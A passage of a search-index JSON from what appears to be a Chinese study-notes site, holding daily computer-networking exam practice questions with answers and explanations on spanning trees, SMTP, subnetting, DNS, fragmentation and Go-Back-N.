3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#31-mon","text":"\u900f\u660e\u7f51\u6865\u4f7f\u7528\u4e86\u4e00\u4e2a\u53eb\u505a\u751f\u6210\u6811\u7684\u7b97\u6cd5\uff0c\u6b64\u7b97\u6cd5\u7684\u6700\u7ec8\u76ee\u7684\u662f\u89e3\u51b3\u900f\u660e\u7f51\u6865\u91cc\u5b58\u5728\u7684\u4ec0\u4e48\u95ee\u9898\uff1f[\u91cd\u5e86\u90ae\u7535\u5927\u5b66803] A\uff0e\u901a\u4fe1\u91cf\u95ee\u9898 B\uff0e\u901a\u4fe1\u8d1f\u8f7d\u95ee\u9898 C\uff0e\u5e7f\u64ad\u98ce\u66b4\u95ee\u9898 D\uff0e\u515c\u5708\u5b50\u95ee\u9898 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u5728\u5f88\u591a\u5b9e\u9645\u7684\u7f51\u7edc\u5e94\u7528\u4e2d\uff0c\u6709\u53ef\u80fd\u7f51\u6865\u4f1a\u53cd\u590d\u8f6c\u53d1\u540c\u4e00\u4e2a\u5e27\uff0c\u4e3a\u4e86\u907f\u514d\u51fa\u73b0\u73af\u72b6\u7ed3\u6784(\u515c\u5708\u5b50\u95ee\u9898)\uff0c\u900f\u660e\u7f51\u6865\u4f7f\u7528\u4e86\u751f\u6210\u6811\u7b97\u6cd5\u3002\u6839\u636e\u751f\u6210\u6811\u7b97\u6cd5\u5236\u5b9a\u7684\u534f\u8bae\u79f0\u4e3a\u751f\u6210\u6811\u534f\u8bae\u3002\u5b83\u7684\u5de5\u4f5c\u539f\u7406\u5982\u4e0b\uff1a \u6839\u7f51\u6865\u662f\u4ece\u7f51\u7edc\u4e2d\u9009\u62e9\u7684\u4e00\u4e2a\u4f5c\u4e3a\u5c5e\u6027\u62d3\u6251\u7684\u6811\u6839\uff1b\u6700\u77ed\u8def\u5f84\u5f00\u9500\u662f\u4e00\u4e2a\u7f51\u6865\u5230\u6839\u7f51\u6865\u7684\u6700\u77ed\u8def\u5f84\uff1b\u6307\u5b9a\u7f51\u6865\u8d1f\u8d23\u8f6c\u53d1\u5230\u6839\u7f51\u6865\u7684\u6570\u636e\uff1b\u5bf9\u4e8e\u6bcf\u4e2a\u975e\u6839\u7f51\u6865\uff0c\u90fd\u9700\u8981\u4ece\u5b83\u7684\u7aef\u53e3\u4e2d\u9009\u51fa\u4e00\u4e2a\u5230\u8fbe\u6839\u7f51\u6865\u8def\u5f84\u6700\u77ed\u7684\u7aef\u53e3\u4f5c\u4e3a\u6839\u7aef\u53e3\uff0c\u8d1f\u8d23\u5c06\u672c\u7f51\u6bb5\u7684\u6570\u636e\u53d1\u9001\u5230\u6839\u7f51\u6865\uff0c\u8fd9\u4e2a\u7aef\u53e3\u53eb\u505a\u6307\u5b9a\u7aef\u53e3\uff0c\u4e00\u4e2a\u7f51\u6bb5\u4e2d\u53ea\u6709\u4e00\u4e2a\u6307\u5b9a\u7aef\u53e3\uff1b\u751f\u6210\u6811\u534f\u8bae\u4e3a\u6bcf\u4e00\u4e2a\u7f51\u6bb5\u9009\u62e9\u4e00\u4e2a\u6307\u5b9a\u7aef\u53e3\uff0c\u90a3\u4e48\u5176\u4ed6\u7684\u7aef\u53e3\u5747\u5904\u4e8e\u963b\u585e\u72b6\u6001\u3002 \u6784\u9020\u751f\u6210\u6811\u9996\u5148\u8981\u9009\u62e9\u4e00\u4e2a\u7f51\u6865\u4f5c\u4e3a\u751f\u6210\u6811\u7684\u6839\u3002\u5b9e\u73b0\u65b9\u6cd5\u662f\u9009\u62e9ID\u6700\u5c0f\u7684\u7f51\u6865\u4f5c\u4e3a\u6839\u7f51\u6865\u3002\u63a5\u7740\uff0c\u6309\u7167\u6839\u5230\u7f51\u6865\u7684\u6700\u77ed\u8def\u5f84\u6765\u6784\u9020\u751f\u6210\u6811\u3002\u5982\u679c\u67d0\u4e2a\u7f51\u6865\u6216\u5c40\u57df\u7f51\u5931\u8d25\uff0c\u5219\u91cd\u65b0\u8ba1\u7b97\u3002\u8be5\u7b97\u6cd5\u7684\u7ed3\u679c\u662f\u5efa\u7acb\u8d77\u4ece\u6bcf\u4e2a\u5c40\u57df\u7f51\u5230\u6839\u7f51\u6865\u7684\u60df\u4e00\u8def\u5f84\u3002\u8be5\u8fc7\u7a0b\u7531\u751f\u6210\u6811\u7b97\u6cd5\u8f6f\u4ef6\u81ea\u52a8\u4ea7\u751f\uff1b\u62d3\u6251\u7ed3\u6784\u53d8\u5316\u65f6\u5c06\u66f4\u65b0\u8ba1\u7b97\u751f\u6210\u6811\u3002","title":"3.1. Mon"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#32-tue","text":"\u4e0b\u5217\u5173\u4e8e\u4ee4\u724c\u73af\u7f51\u7edc\u7684\u63cf\u8ff0\u4e2d\uff0c\u9519\u8bef\u7684\u662f [\u91cd\u5e86\u90ae\u7535\u5927\u5b66803] A.\u4ee4\u724c\u73af\u7f51\u7edc\u5b58\u5728\u51b2\u7a81 B.\u540c\u4e00\u65f6\u523b\uff0c\u73af\u4e0a\u53ea\u6709\u4e00\u4e2a\u6570\u636e\u5728\u4f20\u8f93 C.\u7f51\u4e0a\u6240\u6709\u8282\u70b9\u5171\u4eab\u7f51\u7edc\u5e26\u5bbd D.\u6570\u636e\u4ece\u4e00\u4e2a\u8282\u70b9\u5230\u53e6\u4e00\u4e2a\u8282\u70b9\u7684\u65f6\u95f4\u53ef\u4ee5\u8ba1\u7b97 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u4ee4\u724c\u73af\u7f51\u7684\u62d3\u6251\u7ed3\u6784\u4e3a\u73af\u5f62\uff0c\u5b58\u5728\u4e00\u4e2a\u4ee4\u724c\u4e0d\u505c\u5730\u5728\u73af\u4e2d\u6d41\u52a8\uff0c\u53ea\u6709\u83b7\u5f97\u4e86\u4ee4\u724c\u7684\u4e3b\u673a\u624d\u80fd\u591f\u53d1\u9001\u6570\u636e\uff0c\u56e0\u6b64\u662f\u4e0d\u5b58\u5728\u51b2\u7a81\u7684\u3002","title":"3.2. Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#33-wed","text":"\u4e0b\u5217\u5173\u4e8eSMTP\u534f\u8bae\u7684\u53d9\u8ff0\u4e2d\uff0c\u6b63\u786e\u7684\u662f [\u91cd\u5e86\u90ae\u7535\u5927\u5b66803] I\uff0e\u53ea\u652f\u6301\u4f20\u8f937\u6bd4\u7279ASCII\u7801\u5185\u5bb9 II\uff0e\u652f\u6301\u5728\u90ae\u4ef6\u670d\u52a1\u5668\u4e4b\u95f4\u53d1\u9001\u90ae\u4ef6 III\uff0e\u652f\u6301\u4ece\u7528\u6237\u4ee3\u7406\u5411\u90ae\u4ef6\u670d\u52a1\u5668\u53d1\u9001\u90ae\u4ef6 IV\uff0e\u652f\u6301\u4ece\u90ae\u4ef6\u670d\u52a1\u5668\u5411\u7528\u6237\u4ee3\u7406\u53d1\u9001\u90ae\u4ef6 A\uff0e\u4ec5I\u3001II\u548cIII B\uff0e\u4ec5I\u3001II\u548cIV C\uff0e\u4ec5I\u3001III\u548cIV D\uff0e\u4ec5II\u3001III\u548cIV \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u6839\u636e\u4e0b\u56fe\u53ef\u77e5\uff0cSMTP\u534f\u8bae\u652f\u6301\u5728\u90ae\u4ef6\u670d\u52a1\u5668\u4e4b\u95f4\u53d1\u9001\u90ae\u4ef6\uff0c\u4e5f\u652f\u6301\u4ece\u7528\u6237\u4ee3\u7406\u5411\u90ae\u4ef6\u670d\u52a1\u5668\u53d1\u9001\u4fe1\u606f\u3002\u6b64\u5916\uff0cSMTP\u534f\u8bae\u53ea\u652f\u6301\u4f20\u8f937\u6bd4\u7279\u7684ASCII\u7801\u5185\u5bb9\u3002\u4ece\u90ae\u4ef6\u670d\u52a1\u5668\u5411\u7528\u6237\u4ee3\u7406\u53d1\u9001\u90ae\u4ef6\u4f7f\u7528\u7684\u662fPOP3\u534f\u8bae\u3002","title":"3.3. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#34-thu","text":"\u67d0\u4e3b\u673a\u7684IP\u5730\u5740\u4e3a180.80.77.55\uff0c\u5b50\u7f51\u63a9\u7801\u4e3a255.255.252.0\u3002\u82e5\u8be5\u4e3b\u673a\u5411\u5176\u6240\u5728\u5b50\u7f51\u53d1\u9001\u5e7f\u64ad\u5206\u7ec4\uff0c\u5219\u76ee\u7684\u5730\u5740\u53ef\u4ee5\u662f [\u91cd\u5e86\u90ae\u7535\u5927\u5b66803] A\uff0e180.80.76.0 B\uff0e180.80.76.255 C\uff0e180.80.77.255 D\uff0e180.80.79.255 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1aIPv4\u5730\u5740\u4e2d\u7684\u7279\u6b8a\u5730\u5740\uff0c\u76f4\u63a5\u5e7f\u64ad\u5730\u5740\uff0c\u4e5f\u5c31\u662f\u628a\u4e3b\u673a\u4f4d\u5168\u90e8\u8bbe\u7f6e\u4e3a1\uff0c\u8fd9\u91cc77\u7684\u4e8c\u8fdb\u5236\u662f01001101\uff0c\u5b50\u7f51\u63a9\u7801252\u7684\u4e8c\u8fdb\u5236\u662f11111100\uff0c\u7531\u6b64\u53ef\u4ee5\u770b\u523077\u7684\u524d6\u4f4d\u4f5c\u4e3a\u5b50\u7f51\u4f4d\uff0c\u540e\u56db\u4f4d\u4f5c\u4e3a\u4e3b\u673a\u4f4d\uff0c\u7531\u6b64\u53ef\u4ee5\u77e5\u9053\u5176\u5e7f\u64ad\u5730\u5740\u662f180.80.01001111.255\uff0c\u4e5f\u5c31\u662f180.80.79.255\uff0c\u56e0\u6b64\u7b54\u6848\u662fD\u3002","title":"3.4. Thu"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#4-week-4","text":"","title":"4. Week 4"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#41-tue","text":"\u5982\u679c\u672c\u5730\u57df\u540d\u670d\u52a1\u65e0\u7f13\u5b58\uff0c\u5f53\u91c7\u7528\u9012\u5f52\u65b9\u6cd5\u89e3\u6790\u53e6\u4e00\u7f51\u7edc\u67d0\u4e3b\u673a\u57df\u540d\u65f6\uff0c\u7528\u6237\u4e3b\u673a\u548c\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u53d1\u9001\u7684\u57df\u540d\u8bf7\u6c42\u6761\u6570\u5206\u522b\u4e3a [\u5c71\u4e1c\u519c\u4e1a\u5927\u5b66903-2017] A\uff0e1\u6761\uff0c1\u6761 B\uff0e1\u6761\uff0c\u591a\u6761 C\uff0e\u591a\u6761\uff0c1\u6761 D\uff0e\u591a\u6761\uff0c\u591a\u6761 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u901a\u5e38\uff0c\u57df\u540d\u89e3\u6790\u6709\u9012\u5f52\u89e3\u6790\u4e0e\u9012\u5f52\u8fed\u4ee3\u7ed3\u5408\u89e3\u6790\u4e24\u79cd\u65b9\u5f0f\u3002\u9012\u5f52\u89e3\u6790\u8981\u6c42\u57df\u540d\u670d\u52a1\u5668\u7cfb\u7edf\u4e00\u6b21\u6027\u5b8c\u6210\u5168\u90e8\u57df\u540d\u5730\u5740\u53d8\u6362\u3002\u5982\u679c\u672c\u5730\u57df\u540d\u670d\u52a1\u65e0\u7f13\u5b58\uff0c\u5f53\u91c7\u7528\u9012\u5f52\u65b9\u6cd5\u89e3\u6790\u53e6\u4e00\u7f51\u7edc\u67d0\u4e3b\u673a\u57df\u540d\u65f6\uff0c\u7528\u6237\u4e3b\u673a\u3001\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u53d1\u9001\u7684\u57df\u540d\u8bf7\u6c42\u6761\u6570\u5206\u522b\u4e3a1\u6761\u30011\u6761\u3002\u800c\u8fed\u4ee3\u89e3\u6790\u5219\u662f\u6bcf\u6b21\u8bf7\u6c42\u4e00\u4e2a\u670d\u52a1\u5668\uff0c\u4e0d\u884c\u518d\u8bf7\u6c42\u5176\u4ed6\u670d\u52a1\u5668\u3002\u5982\u679c\u672c\u5730\u57df\u540d\u670d\u52a1\u65e0\u7f13\u5b58\uff0c\u5f53\u91c7\u7528\u8fed\u4ee3\u65b9\u6cd5\u89e3\u6790\u53e6\u4e00\u7f51\u7edc\u67d0\u4e3b\u673a\u57df\u540d\u65f6\uff0c\u7528\u6237\u4e3b\u673a\u3001\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u53d1\u9001\u7684\u57df\u540d\u8bf7\u6c42\u6761\u6570\u5206\u522b\u4e3a1\u6761\u3001\u591a\u6761\u3002","title":"4.1. Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/","text":"\u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 July # \u76ee\u5f55 # \u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 July \u76ee\u5f55 1. Week 3 1.1. Wed 1.2. Thu 1.3. Fri 1.4. Sat 1.5. Sun 2. Week 4 2.1. Mon 2.2. Tue 2.3. Wed 2.4. Thu 2.5. Fri 2.6. Sat 2.7. Sun 1. Week 3 # 1.1. Wed # \u67d0\u7f51\u7edc\u7684IP\u5730\u5740\u7a7a\u95f4\u4e3a192.168.5.0/24\uff0c\u91c7\u7528\u5b9a\u957f\u5b50\u7f51\u5212\u5206\uff0c\u5b50\u7f51\u63a9\u7801\u4e3a255.255.255.248\uff0c\u5219\u8be5\u7f51\u7edc\u7684\u6700\u5927\u5b50\u7f51\u4e2a\u6570\uff0c\u6bcf\u4e2a\u5b50\u7f51\u5185\u7684\u6700\u5927\u53ef\u5206\u914d\u5730\u5740\u4e2a\u6570\u4e3a\u5404\u4e3a\u591a\u5c11\uff1f[\u897f\u5317\u5927\u5b66] A.32. 6 B.32. 8 C.8. 32 D.8. 30 \u6ce8\uff1a\u4e3b\u673a\u53f7\u51680\u4e3a\u7f51\u7edc\u5730\u5740\uff0c\u51681\u4e3a\u5e7f\u64ad\u5730\u5740 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u4e00\u4e2aIP\u7684\u7ec4\u6210\u90e8\u5206\u4e3a\uff1a\u7f51\u7edc\u53f7+\u5b50\u7f51\u53f7+\u4e3b\u673a\u53f7\uff0c\u5bf9\u4e8e\u8fd9\u6837\u7684IP 192.168.5.0/24,\u7531/24\u53ef\u4ee5\u77e5\u9053\u5176\u5b50\u7f51\u63a9\u7801\u9ed8\u8ba4\u4e3a255.255.255.0 \uff0c255.255.255.248,\u4e8c\u8fdb\u5236\u4f4d\uff1a(11111111. 11111111. 11111111)(24\u8868\u793a\u7f51\u7edc\u53f7).11111(\u5b50\u7f51\u63a9\u7801) 000 \uff0c\u5b50\u7f51\u63a9\u7801\u4e2d\u51681\u8868\u793a\u7684\u7f51\u7edc\u53f7\u548c\u5b50\u7f51\u53f7\u90e8\u5206\uff0c0\u90e8\u5206\u8868\u793a\u4e3b\u673a\u53f7\u90e8\u5206\u3002(11111)2 \u8f6c\u6362\u4e3a\u5341\u8fdb\u5236\u4e3a2^5 =32 \u6240\u4ee5\u53ef\u4ee5\u5212\u5206\u4e3a32\u4e2a\u5b50\u7f51\uff0c\u800c\u540e\u9762\u67093\u4e2a0\uff0c\u6240\u4ee5000 - 111\u8868\u793a\u7684\u8303\u56f42^3 -2\uff08\u51680\u548c\u51681\u4e0d\u53ef\u7528\uff09=6 \u6240\u4ee5\u7b54\u6848\u4e3a32,6 \u9009A\u3002 1.2. Thu # \u5f53\u4e00\u4e2aIP\u5206\u7ec4\u8fdb\u884c\u76f4\u63a5\u4ea4\u4ed8\u65f6\uff0c\u8981\u6c42\u53d1\u9001\u65b9\u548c\u76ee\u7684\u7ad9\u5177\u6709\u76f8\u540c\u7684 \u3002[\u897f\u5317\u5927\u5b66] A\uff0eIP\u5730\u5740 B\uff0e\u4e3b\u673a\u53f7 C\uff0e\u7f51\u7edc\u53f7 D\uff0e\u5b50\u7f51\u5730\u5740 \u6ce8\uff1a\u4e09\u7ea7IP\u5730\u5740\u7684\u7ed3\u6784\u4e3a IP\u5730\u5740 = {<\u7f51\u7edc\u53f7>\uff0c<\u5b50\u7f51\u53f7>\uff0c<\u4e3b\u673a\u53f7>}\u3002\u65e0\u5206\u7c7b\u57df\u95f4\u8def\u7531\u9009\u62e9(CIDR)\u4f7f\u7528\u7f51\u7edc\u524d\u7f00\u7684\u6982\u5ff5\u4ee3\u66ff\u5b50\u7f51\u7684\u6982\u5ff5\uff0cIP\u5730\u5740\u7684\u65e0\u5206\u7c7b\u4e24\u7ea7\u7f16\u5740\u4e3a IP\u5730\u5740 = {<\u7f51\u7edc\u524d\u7f00>\uff0c<\u4e3b\u673a\u53f7>}\u3002 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u5224\u65ad\u4e00\u4e2aIP\u5206\u7ec4\u7684\u4ea4\u4ed8\u65b9\u5f0f\u662f\u76f4\u63a5\u4ea4\u4ed8\u8fd8\u662f\u95f4\u63a5\u4ea4\u4ed8\uff0c\u8def\u7531\u5668\u9700\u8981\u6839\u636e\u5206\u7ec4\u7684\u76ee\u7684IP\u5730\u5740\u548c\u6e90IP\u5730\u5740\u662f\u5426\u5c5e\u4e8e\u540c\u4e00\u4e2a\u5b50\u7f51\u6765\u8fdb\u884c\u5224\u65ad\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5c06\u4e00\u4e2a\u5206\u7ec4\u7684\u6e90IP\u5730\u5740\u548c\u76ee\u7684IP\u5730\u5740\u5206\u522b\u4e0e\u5b50\u7f51\u63a9\u7801\u8fdb\u884c\u201c\u4e0e\u201d\u6bd4\u8f83\uff0c\u5982\u679c\u5f97\u5230\u7684\u5b50\u7f51\u5730\u5740\u76f8\u540c\uff0c\u8be5\u5206\u7ec4\u5c31\u91c7\u7528\u76f4\u63a5\u4ea4\u4ed8\u65b9\u5f0f\uff0c\u5426\u5219\u5c31\u8fdb\u884c\u95f4\u63a5\u4ea4\u4ed8\u3002 1.3. Fri # \u4e00\u4e2aUDP\u7528\u6237\u6570\u636e\u62a5\u7684\u6570\u636e\u5b57\u6bb5\u4e3a8192\u5b57\u8282\u3002\u5728\u94fe\u8def\u5c42\u8981\u4f7f\u7528\u4ee5\u592a\u7f51\u6765\u4f20\u9001\uff0c\u5e94\u5f53\u5212\u5206\u4e3a \u4e2aIP\u6570\u636e\u62a5\u7247\uff0c\u6700\u540e\u4e00\u4e2aIP\u6570\u636e\u62a5\u7247\u7684\u5b57\u6bb5\u957f\u5ea6\u4e3a \u3002[\u5409\u6797\u5927\u5b66\u7b80\u7b54\u9898\u6539\u7f16] A\uff0e6\uff0c800 B\uff0e6\uff0c1480 C\uff0e7\uff0c800 D\uff0e7\uff0c1480 \u6ce8\uff1aIP\u9996\u90e8\u4e3a20B\uff0cUDP\u9996\u90e8\u4e3a8B\uff0cTCP\u9996\u90e8\u4e3a20B\uff0c\u4ee5\u592a\u7f51\u4f20\u8f93\u7684\u6570\u636e\u5b57\u6bb5\u957f\u5ea6\u8303\u56f4\u4e3a46-1500\u3002 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u6570\u636e\u62a5\u603b\u957f\u5ea6=8192+8\uff08UDP\u9996\u90e8\uff09=8200\u5b57\u8282\uff0c\u4ee5\u592a\u7f51\u4f20\u9001\uff0cIP\u5c42\u6700\u5927\u4f20\u9001\u5355\u5143MTU=1500\uff0c\u56e0\u4e3aIP\u9996\u90e8\u4e3a20\u5b57\u8282\uff0c\u6240\u4ee5\u6570\u636e\u90e8\u5206\u5360\u4e861480\u5b57\u8282\uff0c\u5219\uff1a8200/1480=5......800\uff0c\u6240\u4ee5\u5212\u5206\u4e3a6\u4e2aIP\u6570\u636e\u62a5\u7247\uff0c\u524d\u4e94\u4e2a\u6570\u636e\u5b57\u6bb5\u957f\u5ea6\u4e3a1480\u5b57\u8282\uff0c\u6700\u540e\u4e00\u4e2a\u6570\u636e\u5b57\u6bb5\u957f\u5ea6\u4e3a800\u5b57\u8282\u3002 1.4. Sat # \u4e00\u4e2a\u8def\u7531\u5668\u7684\u8def\u7531\u8868\u901a\u5e38\u5305\u542b \u3002[\u5409\u6797\u5927\u5b66] A\uff0e\u76ee\u7684\u7f51\u7edc\u548c\u5230\u8fbe\u8be5\u76ee\u7684\u7f51\u7edc\u7684\u5b8c\u6574\u8def\u5f84 B\uff0e\u6240\u6709\u7684\u76ee\u7684\u4e3b\u673a\u548c\u5230\u8fbe\u8be5\u76ee\u7684\u4e3b\u673a\u7684\u5b8c\u6574\u8def\u5f84 C\uff0e\u76ee\u7684\u7f51\u7edc\u548c\u5230\u8fbe\u8be5\u76ee\u7684\u7f51\u7edc\u8def\u5f84\u4e0a\u7684\u4e0b\u4e00\u4e2a\u8def\u7531\u5668\u7684IP\u5730\u5740 D\uff0e\u4e92\u8054\u7f51\u4e2d\u6240\u6709\u8def\u7531\u5668\u7684IP\u5730\u5740 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u5728IP\u4e92\u8054\u7f51\u4e2d\uff0c\u9700\u8981\u8fdb\u884c\u8def\u7531\u9009\u62e9\u7684\u8bbe\u5907\u4e00\u822c\u91c7\u7528\u8868\u9a71\u52a8\u7684\u8def\u7531\u9009\u62e9\u7b97\u6cd5\u3002\u6bcf\u53f0\u9700\u8981\u8def\u7531\u9009\u62e9\u7684\u8bbe\u5907\u4fdd\u5b58\u4e00\u5f20IP\u8def\u7531\u8868\uff0c\u8be5\u8868\u5b58\u50a8\u7740\u6709\u5173\u53ef\u80fd\u7684\u76ee\u7684\u5730\u5740\u53ca\u600e\u6837\u5230\u8fbe\u76ee\u7684\u5730\u5740\u7684\u4fe1\u606f\u3002\u5728\u9700\u8981\u4f20\u9001IP\u6570\u636e\u62a5\u65f6\uff0c\u5b83\u5c31\u67e5\u8be2\u8be5IP\u8def\u7531\u8868\uff0c\u51b3\u5b9a\u628a\u6570\u636e\u62a5\u53d1\u5f80\u4f55\u5904\u3002\u56e0\u7279\u7f51\u7684\u8def\u7531\u9009\u62e9\u7b97\u6cd5\u901a\u5e38\u4f7f\u7528\u4e00\u5f20IP\u8def\u7531\u9009\u62e9\u8868(\u8def\u7531\u8868)\uff0c\u4e00\u4e2a\u8def\u7531\u8868\u901a\u5e38\u5305\u542b\u8bb8\u591a(N\uff0cR)\u5bf9\u5e8f\u5076\uff0c\u5176\u4e2dN\u6307\u7684\u662f\u76ee\u7684\u7f51\u7edcIP\u5730\u5740\uff0cR\u662f\u5230\u7f51\u7edcN\u8def\u5f84\u4e0a\u4e0b\u4e00\u4e2a\u8def\u7531\u5668\u7684IP\u5730\u5740\u3002 1.5. Sun # \u5bf9\u4e8e100Mbps \u7684\u4ee5\u592a\u7f51\u4ea4\u6362\u673a\uff0c\u5f53\u8f93\u51fa\u7aef\u53e3\u65e0\u6392\u961f\uff0c\u4ee5\u76f4\u901a\u4ea4\u6362\uff08cut-through switching\uff09\u65b9\u5f0f\u8f6c\u53d1\u4e00\u4e2a\u4ee5\u592a\u7f51\u5e27\uff08\u4e0d\u5305\u62ec\u524d\u5bfc\u7801\uff09\u65f6\uff0c\u5f15\u5165\u7684\u8f6c\u53d1\u5ef6\u8fdf\u81f3\u5c11\u662f\u3002[\u5357\u4eac\u5927\u5b66] A. 0\u03bcs B. 0.48\u03bcs C. 5.12\u03bcs D. 121.44\u03bcs \u6ce8\uff1a\u4ee5\u592a\u7f51\u5e27\u524d\u5bfc\u7801\u4e3a8B\uff0c\u5730\u5740\u4e3a6B\uff0c\u76f4\u901a\u4ea4\u6362\u53ea\u68c0\u67e5\u5e27\u7684\u76ee\u7684\u5730\u5740\u3002 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u4ee5\u592a\u7f51\u7684\u76f4\u901a\u4ea4\u6362\u65b9\u5f0f\u5728\u8f93\u5165\u7aef\u53e3\u68c0\u6d4b\u5230\u4e00\u4e2a \u6570\u636e\u5305\u65f6\uff0c\u68c0\u67e5\u8be5\u5305\u7684\u5305\u5934\uff0c\u83b7\u53d6\u5305\u7684\u76ee\u7684\u5730\u5740\uff0c\u542f\u52a8\u5185\u90e8\u7684\u52a8\u6001\u67e5\u627e\u8868\u8f6c\u6362\u6210\u76f8\u5e94\u7684\u8f93\u51fa\u7aef\u53e3\uff0c\u5728\u8f93\u5165\u4e0e\u8f93\u51fa\u4ea4\u53c9\u5904\u63a5\u901a\uff0c\u628a\u6570\u636e\u5305\u76f4\u901a\u5230\u76f8\u5e94\u7684\u7aef\u53e3\uff0c\u5b9e\u73b0\u4ea4\u6362\u529f\u80fd\u3002\u5b83\u53ea\u68c0\u67e5\u6570\u636e\u5305\u7684\u5305\u5934(\u5305\u62ec7\u4e2a\u5b57\u8282\u7684\u524d\u540c\u6b65\u7801+1\u4e2a\u5b57\u8282\u7684\u5e27\u5f00\u59cb\u754c\u5b9a\u7b26+6\u4e2a\u5b57\u8282\u7684\u76ee\u7684\u5730\u5740\u517114\u4e2a\u5b57\u8282)\uff0c\u6709\u65f6\u9898\u76ee\u8bf4\u660e\u4e0d\u5305\u542b\u524d\u5bfc\u7801\uff0c\u5373\u53ea\u53056\u4e2a\u5b57\u8282\u542b\u76ee\u7684\u5730\u5740\u3002\u90a3\u4e48\u8f6c\u53d1\u65f6\u5ef6=6B/100Mbps=6*8b/[(100*10^6)b/10^6us]= 0.48us\u3002 2. Week 4 # 2.1. Mon # \u6570\u636e\u94fe\u8def\u5c42\u91c7\u7528\u4e86\u540e\u9000N\u5e27(GBN)\u534f\u8bae\uff0c\u53d1\u9001\u65b9\u5df2\u7ecf\u53d1\u9001\u4e86\u7f16\u53f7\u4e3a0\uff5e7\u7684\u5e27\u3002\u5f53\u8ba1\u65f6\u5668\u8d85\u65f6\u65f6\uff0c\u82e5\u53d1\u9001\u65b9\u53ea\u6536\u52300\u30012\u30013\u53f7\u5e27\u7684\u786e\u8ba4\uff0c\u5219\u53d1\u9001\u65b9\u9700\u8981\u91cd\u53d1\u7684\u5e27\u6570\u662f\u3002[\u5357\u4eac\u5927\u5b66] A\uff0e2 B\uff0e3 C\uff0e4 D\uff0e5 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u6839\u636e\u540e\u9000N\u5e27\u534f\u8bae\uff0c\u5f53\u63a5\u6536\u65b9\u68c0\u6d4b\u51fa\u5931\u5e8f\u7684\u4fe1\u606f\u5e27\u540e\uff0c\u8981\u6c42\u53d1\u9001 \u65b9\u91cd\u53d1\u6700\u540e\u4e00\u4e2a\u6b63\u786e\u63a5\u6536\u7684\u4fe1\u606f\u5e27\u4e4b\u540e\u7684\u6240\u6709\u672a\u88ab\u786e\u8ba4\u7684\u5e27\uff1b\u6216\u8005\u5f53\u53d1\u9001\u65b9\u53d1\u9001\u4e86N\u4e2a\u5e27\u540e\uff0c\u82e5\u53d1\u73b0\u8be5N\u5e27\u7684 \u524d\u4e00\u4e2a\u5e27\u5728\u8ba1\u65f6\u5668\u8d85\u65f6\u540e\u4ecd\u672a\u8fd4\u56de\u5176\u786e\u8ba4\u4fe1\u606f\uff0c\u5219\u8be5\u5e27\u88ab\u5224\u4e3a\u51fa\u9519\u6216\u4e22\u5931,\u6b64\u65f6\u53d1\u9001\u65b9\u5c31\u4e0d\u5f97\u4e0d\u91cd\u65b0\u53d1\u9001\u51fa\u9519\u5e27 \u53ca\u5176\u540e\u7684N\u5e27\u3002\u672c\u9898\u6536\u52303\u53f7\u5e27\u7684\u786e\u8ba4\uff0c\u8bf4\u660e0, 1, 2, 3\u53f7\u5e27\u5df2\u7ecf\u6536\u5230\uff0c\u4e22\u5931\u7684\u662f4, 5, 6, 7\u53f7\u5e27\uff0c\u51714\u5e27\u3002\u56e0\u6b64\u7b54\u6848\u4e3aC\u9879\u3002 2.2. Tue # 